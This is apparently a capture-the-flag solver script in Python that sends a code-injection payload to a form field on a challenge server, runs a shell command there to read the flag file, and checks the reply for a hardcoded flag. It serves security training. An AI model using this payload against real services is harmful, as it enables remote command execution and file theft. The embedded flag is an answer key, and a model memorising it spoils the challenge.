import sys, os, requests 

def solve() -> bool:
    flag = "magpie{4int_no_party_4int_n0_d1sc0}"
    challenge_host = "http://srv1.magpiectf.ca:3467"
    payload = "__import__('subprocess').getoutput('cat /flag/flag.txt')"

    r = requests.post(challenge_host, data={"inputShoulder": payload}) 
    return flag in r.text 